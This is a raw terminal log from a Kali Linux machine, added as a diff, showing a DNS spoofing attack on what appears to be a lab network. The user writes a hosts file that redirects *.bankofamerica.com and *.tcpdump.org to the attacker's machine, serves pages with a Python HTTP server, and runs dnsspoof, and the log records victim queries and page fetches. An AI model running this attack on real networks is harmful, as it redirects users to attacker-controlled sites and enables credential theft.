@@ -1,0 +1,291 @@
+ 192.168.78.128  netmask 255.255.255.0  broadcast 192.168.78.255
+        inet6 fe80::20c:29ff:fe67:7328  prefixlen 64  scopeid 0x20<link>
+        ether 00:0c:29:67:73:28  txqueuelen 1000  (Ethernet)
+        RX packets 1586  bytes 527407 (515.0 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 1034  bytes 127617 (124.6 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 12  bytes 600 (600.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 12  bytes 600 (600.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+                                                                                                                                                 
+┌──(aayushinirmal㉿kali)-[~]
+└─$ sudo python -m SimpleHTTPServer 80 &
+[1] 1898
+                                                                                                                                                 
+┌──(aayushinirmal㉿kali)-[~]
+└─$                                                                                                                                          1 ⚙
+[1]  + suspended (tty output)  sudo python -m SimpleHTTPServer 80
+┌──(aayushinirmal㉿kali)-[~]
+└─$ sudo tcpdump -n udp and port 53                                                                                                          1 ⚙
+[sudo] password for aayushinirmal: 
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+^[[A^C
+0 packets captured
+0 packets received by filter
+0 packets dropped by kernel
+                                                                                                                                                 
+┌──(aayushinirmal㉿kali)-[~]
+└─$ cat poisonhosts                                                                                                                          1 ⚙
+192.168.78.128 *.bankofamerica.com
+192.168.78.128 *.tcpdump.org
+                                                                                                                                                 
+┌──(aayushinirmal㉿kali)-[~]
+└─$ rm poisonhosts                                                                                                                           1 ⚙
+                                                                                                                                                 
+┌──(aayushinirmal㉿kali)-[~]
+└─$ cat poisonhosts                                                                                                                          1 ⚙
+cat: poisonhosts: No such file or directory
+                                                                                                                                                 
+┌──(aayushinirmal㉿kali)-[~]
+└─$ echo 169.254.117.32 *.bankofamerica.com > poisonhosts                                                                                1 ⨯ 1 ⚙
+                                                                                                                                                 
+┌──(aayushinirmal㉿kali)-[~]
+└─$ echo 169.254.117.32 *.tcpdump.org >> poisonhosts                                                                                         1 ⚙
+                                                                                                                                                 
+┌──(aayushinirmal㉿kali)-[~]
+└─$ cat poisonhosts                                                                                                                          1 ⚙
+169.254.117.32 *.bankofamerica.com
+169.254.117.32 *.tcpdump.org
+                                                                                                                                                 
+┌──(aayushinirmal㉿kali)-[~]
+└─$ sudo python -m SimpleHTTPServer 80 &                                                                                                     1 ⚙
+[2] 1944
+                                                                                                                                                 
+┌──(aayushinirmal㉿kali)-[~]
+└─$ Serving HTTP on 0.0.0.0 port 80 ...                                                                                                      2 ⚙
+sudo dnsspoof -f posionhosts                         
+dnsspoof: fopen: No such file or directory
+                                                                                                                                                 
+┌──(aayushinirmal㉿kali)-[~]
+└─$ sudo dnsspoof -f posionhosts                                                                                                         1 ⨯ 2 ⚙
+dnsspoof: fopen: No such file or directory
+                                                                                                                                                 
+┌──(aayushinirmal㉿kali)-[~]
+└─$ dnsspoof                                                                                                                             1 ⨯ 2 ⚙
+dnsspoof: libnet_open_link(): UID/EUID 0 or capability CAP_NET_RAW required
+                                                                                                                                                 
+┌──(aayushinirmal㉿kali)-[~]
+└─$ dnsspoof                                                                                                                             1 ⨯ 2 ⚙
+dnsspoof: libnet_open_link(): UID/EUID 0 or capability CAP_NET_RAW required
+                                                                                                                                                 
+┌──(aayushinirmal㉿kali)-[~]
+└─$ sudo dnsspoof -f posionhosts                                                                                                         1 ⨯ 2 ⚙
+[sudo] password for aayushinirmal: 
+dnsspoof: fopen: No such file or directory
+                                                                                                                                                 
+┌──(aayushinirmal㉿kali)-[~]
+└─$ dnsspoof                                                                                                                             1 ⨯ 2 ⚙
+dnsspoof: libnet_open_link(): UID/EUID 0 or capability CAP_NET_RAW required
+                                                                                                                                                 
+┌──(aayushinirmal㉿kali)-[~]
+└─$ man dnsspoof                                                                                                                         1 ⨯ 2 ⚙
+                                                                                                                                                 
+┌──(aayushinirmal㉿kali)-[~]
+└─$ sudo dnsspoof -f posionhosts                                                                                                             2 ⚙
+dnsspoof: fopen: No such file or directory
+                                                                                                                                                 
+┌──(aayushinirmal㉿kali)-[~]
+└─$ sudo dnsspoof -f poisonhosts                                                                                                         1 ⨯ 2 ⚙
+dnsspoof: listening on eth0 [udp dst port 53 and not src 192.168.78.128]
+192.168.78.130.56153 > 192.168.78.2.53:  1296+ A? www.bankofamerica.com
+192.168.78.130.58732 > 192.168.78.2.53:  33987+ A? sofa.bankofamerica.com
+192.168.78.130.64225 > 192.168.78.2.53:  19341+ A? boss.bankofamerica.com
+192.168.78.130.50624 > 192.168.78.2.53:  35813+ A? dull.bankofamerica.com
+192.168.78.130.63772 > 192.168.78.2.53:  4469+ A? dune.bankofamerica.com
+192.168.78.130.50689 > 192.168.78.2.53:  22954+ A? loop.bankofamerica.com
+192.168.78.130.58571 > 192.168.78.2.53:  14522+ A? rail.bankofamerica.com
+192.168.78.130.65324 > 192.168.78.2.53:  14863+ A? secure.bankofamerica.com
+192.168.78.130.52033 > 192.168.78.2.53:  27621+ A? tilt.bankofamerica.com
+192.168.78.130.49643 > 192.168.78.2.53:  5525+ A? about.bankofamerica.com
+192.168.78.130.57542 > 192.168.78.2.53:  9930+ A? bettermoneyhabits.bankofamerica.com
+192.168.78.130.61141 > 192.168.78.2.53:  11769+ A? homeloanhelp.bankofamerica.com
+192.168.78.130.62895 > 192.168.78.2.53:  50970+ A? locators.bankofamerica.com
+192.168.78.130.50604 > 192.168.78.2.53:  48897+ A? promo.bankofamerica.com
+192.168.78.130.51076 > 192.168.78.2.53:  59321+ A? realestatecenter.bankofamerica.com
+192.168.78.130.59400 > 192.168.78.2.53:  17013+ A? staticweb.bankofamerica.com
+192.168.78.130.50547 > 192.168.78.2.53:  2785+ A? www.privatebank.bankofamerica.com
+192.168.78.130.59664 > 192.168.78.2.53:  7108+ A? careers.bankofamerica.com
+192.168.78.130.64122 > 192.168.78.2.53:  33930+ A? aero.bankofamerica.com
+192.168.78.130.58898 > 192.168.78.2.53:  13729+ A? aero.bankofamerica.com
+192.168.78.130.62946 > 192.168.78.2.53:  11106+ A? aero.bankofamerica.com
+192.168.78.130.57863 > 192.168.78.2.53:  5582+ A? aero.bankofamerica.com
+^L^C                                                                                                                                          
+┌──(aayushinirmal㉿kali)-[~]
+└─$                                                                2 ⚙
+                                                                       
+┌──(aayushinirmal㉿kali)-[~]
+┌──(aayushinirmal㉿kali)-[~]
+└─$                                                          130 ⨯ 2 ⚙
+                                                                       
+┌──(aayushinirmal㉿kali)-[~]
+└─$                                                          130 ⨯ 2 ⚙
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+┌──(aayushinirmal㉿kali)-[~]
+└─$ sudo dnsspoof -f poisonhosts                             130 ⨯ 2 ⚙
+[sudo] password for aayushinirmal: 
+dnsspoof: listening on eth0 [udp dst port 53 and not src 192.168.78.128]
+192.168.78.130.57600 > 77.88.8.8.53:  15583+ A? www.bankofamerica.com
+^C                                                                       
+┌──(aayushinirmal㉿kali)-[~]
+└─$ nano poisonhosts                                              2 ⚙
+                                                                      
+┌──(aayushinirmal㉿kali)-[~]
+└─$ rm poisonhosts                                                2 ⚙
+                                                                      
+┌──(aayushinirmal㉿kali)-[~]
+└─$ echo 192.168.78.128 *.bankofamerica.com > poisonhosts         2 ⚙
+                                                                      
+┌──(aayushinirmal㉿kali)-[~]
+└─$ echo 192.168.78.128 *.tcpdump.org > poisonhosts               2 ⚙
+                                                                      
+┌──(aayushinirmal㉿kali)-[~]
+└─$ sudo nano poisonhosts                                         2 ⚙
+
+
+Use "fg" to return to nano.
+zsh: suspended (signal)  sudo nano poisonhosts
+                                                                      
+┌──(aayushinirmal㉿kali)-[~]
+└─$ sudo nano poisonhosts                                   147 ⨯ 3 ⚙
+                                                                      
+┌──(aayushinirmal㉿kali)-[~]
+└─$ rm poisonhosts                                                3 ⚙
+                                                                      
+┌──(aayushinirmal㉿kali)-[~]
+└─$ echo 192.168.78.128 *.bankofamerica.com > poisonhosts         3 ⚙
+                                                                      
+┌──(aayushinirmal㉿kali)-[~]
+└─$ echo 192.168.78.128 *.tcpdump.org >> poisonhosts              3 ⚙
+                                                                      
+┌──(aayushinirmal㉿kali)-[~]
+└─$ ls                                                            3 ⚙
+Desktop    Downloads  go_project  Music     poisonhosts  Templates
+Documents  go         index.html  Pictures  Public       Videos
+                                                                      
+┌──(aayushinirmal㉿kali)-[~]
+└─$ 127.0.0.1 - - [01/Apr/2021 22:00:00] "GET / HTTP/1.1" 200 -   3 ⚙
+127.0.0.1 - - [01/Apr/2021 22:00:00] code 404, message File not found
+127.0.0.1 - - [01/Apr/2021 22:00:00] "GET /favicon.ico HTTP/1.1" 404 -
+
+                                                                      
+┌──(aayushinirmal㉿kali)-[~]
+┌──(aayushinirmal㉿kali)-[~]
+└─$ sudo dnsspoof -f poisonhosts                            130 ⨯ 3 ⚙
+dnsspoof: listening on eth0 [udp dst port 53 and not src 192.168.78.128]
+192.168.78.130.54964 > 77.88.8.8.53:  40295+ A? www.tcpdump.org
+192.168.78.130 - - [01/Apr/2021 22:00:56] "GET / HTTP/1.1" 200 -
+192.168.78.130 - - [01/Apr/2021 22:00:56] code 404, message File not found
+192.168.78.130 - - [01/Apr/2021 22:00:56] "GET /favicon.ico HTTP/1.1" 404 -
+^C                                                                      
+┌──(aayushinirmal㉿kali)-[~]
+└─$ sudo service ssh status                                       3 ⚙
+● ssh.service - OpenBSD Secure Shell server
+     Loaded: loaded (/lib/systemd/system/ssh.service; disabled; vendo>
+     Active: inactive (dead)
+       Docs: man:sshd(8)
+             man:sshd_config(5)
+...skipping...
+● ssh.service - OpenBSD Secure Shell server
+     Loaded: loaded (/lib/systemd/system/ssh.service; disabled; vendo>
+     Active: inactive (dead)
+       Docs: man:sshd(8)
+             man:sshd_config(5)
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+                                                                      
+┌──(aayushinirmal㉿kali)-[~]
+└─$ sudo service ssh start                                    3 ⨯ 3 ⚙
+                                                                      
+┌──(aayushinirmal㉿kali)-[~]
+└─$ sudo service ssh status                                       3 ⚙
+● ssh.service - OpenBSD Secure Shell server
+     Loaded: loaded (/lib/systemd/system/ssh.service; disabled; vendo>
+     Active: active (running) since Thu 2021-04-01 22:09:11 EDT; 6s a>
+       Docs: man:sshd(8)
+             man:sshd_config(5)
+    Process: 3067 ExecStartPre=/usr/sbin/sshd -t (code=exited, status>
+   Main PID: 3068 (sshd)
+      Tasks: 1 (limit: 2290)
+     Memory: 2.1M
+        CPU: 52ms
+     CGroup: /system.slice/ssh.service
+             └─3068 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 st>
+
+Apr 01 22:09:11 kali systemd[1]: Starting OpenBSD Secure Shell server>
+Apr 01 22:09:11 kali sshd[3068]: Server listening on 0.0.0.0 port 22.
+Apr 01 22:09:11 kali sshd[3068]: Server listening on :: port 22.
+Apr 01 22:09:11 kali systemd[1]: Started OpenBSD Secure Shell server.
+
+                                                                      
+┌──(aayushinirmal㉿kali)-[~]
+└─$ sudo dnsspoof -f poisonhosts192.168.78.130 - - [02/Apr/2021 02:33:31] code 404, message File not found
+192.168.78.130 - - [02/Apr/2021 02:33:31] "GET /wpad.dat HTTP/1.1" 404 -
+
+                                                                      
+┌──(aayushinirmal㉿kali)-[~]
+└─$ sudo python -m SimpleHTTPServer 80 &  
+
+
+sudo tcpdump -n udp and port 53
